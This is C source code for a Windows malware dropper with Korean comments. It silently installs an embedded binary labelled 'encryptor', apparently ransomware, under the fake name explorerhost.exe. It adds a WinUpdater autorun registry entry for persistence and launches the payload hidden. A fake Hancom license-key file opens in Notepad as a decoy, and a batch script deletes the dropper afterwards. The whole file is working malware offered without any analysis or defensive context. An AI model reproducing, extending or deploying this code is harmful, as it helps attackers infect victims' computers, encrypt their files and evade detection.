#include <windows.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <stdio.h>
#include "resource1.h"

#pragma comment(lib, "shlwapi.lib")

#define INSTALL_DIR_NAME L"winupdater"
#define INSTALL_EXE_NAME L"explorerhost.exe"
#define REG_PATH L"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
#define REG_NAME L"WinUpdater"

// 리소스 추출 함수
BOOL ExtractResource(WORD resourceID, LPCWSTR outputPath) {
    HRSRC hResource = FindResource(NULL, MAKEINTRESOURCE(resourceID), L"BIN");
    if (!hResource) return FALSE;
    HGLOBAL hLoaded = LoadResource(NULL, hResource);
    if (!hLoaded) return FALSE;

    DWORD size = SizeofResource(NULL, hResource);
    LPVOID data = LockResource(hLoaded);
    if (!data) return FALSE;

    HANDLE hFile = CreateFile(outputPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    DWORD written;
    WriteFile(hFile, data, size, &written, NULL);
    CloseHandle(hFile);

    return TRUE;
}

// autorun 등록
void RegisterAutoRun(const WCHAR* exePath) {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, REG_PATH, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, REG_NAME, 0, REG_SZ, (BYTE*)exePath, (DWORD)(wcslen(exePath) + 1) * sizeof(WCHAR));
        RegCloseKey(hKey);
    }
}

// 드로퍼 자기 삭제 예약
void ScheduleSelfDelete() {
    WCHAR selfPath[MAX_PATH];
    GetModuleFileNameW(NULL, selfPath, MAX_PATH);

    WCHAR batPath[MAX_PATH];
    wcscpy(batPath, selfPath);
    PathRemoveFileSpecW(batPath);
    wcscat(batPath, L"\\delself.bat");

    FILE* fp = _wfopen(batPath, L"w");
    if (fp) {
        fwprintf(fp,
            L":Repeat\n"
            L"del \"%s\"\n"
            L"if exist \"%s\" goto Repeat\n"
            L"del \"%%~f0\"\n",
            selfPath, selfPath);
        fclose(fp);
        ShellExecuteW(NULL, NULL, batPath, NULL, NULL, SW_HIDE);
    }
}

// 훼이크 텍스트 파일 생성
void WriteFakeHancomKey(const char* filepath) {
    FILE* fp = fopen(filepath, "w");  // ANSI 인코딩
    if (!fp) return;

    fprintf(fp,
        "[Hancom Install Configuration Key]\n\n"
        "ProductKey=HNC-2025-X9AD-KW8Q-TX31\n"
        "User=Corporate License\n"
        "InstallPath=C:\\Program Files\\Hnc\\\n"
        "Version=11.5.2.103\n"
        "LicenseType=Enterprise\n"
    );

    fclose(fp);
}

// Main
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    WCHAR appData[MAX_PATH];
    SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appData);

    WCHAR targetDir[MAX_PATH];
    swprintf(targetDir, MAX_PATH, L"%s\\%s", appData, INSTALL_DIR_NAME);
    CreateDirectoryW(targetDir, NULL);

    // 1. encryptor 드롭
    WCHAR encryptorPath[MAX_PATH];
    swprintf(encryptorPath, MAX_PATH, L"%s\\%s", targetDir, INSTALL_EXE_NAME);
    ExtractResource(IDR_ENCRYPTOR_BIN, encryptorPath);

    // 2. 텍스트 파일 드롭
    char txtPath[MAX_PATH];
    wcstombs(txtPath, targetDir, MAX_PATH);
    strcat(txtPath, "\\hancom_setup_key.txt");
    WriteFakeHancomKey(txtPath);

    // 3. autorun 등록
    RegisterAutoRun(encryptorPath);

    // 4. encryptor 백그라운드 실행
    ShellExecuteW(NULL, NULL, encryptorPath, NULL, NULL, SW_HIDE);

    // 5. 텍스트 파일 메모장으로 실행
    ShellExecuteW(NULL, NULL, L"notepad.exe", L"hancom_setup_key.txt", targetDir, SW_SHOW);

    // 6. 자기 삭제 예약
    ScheduleSelfDelete();

    return 0;
}
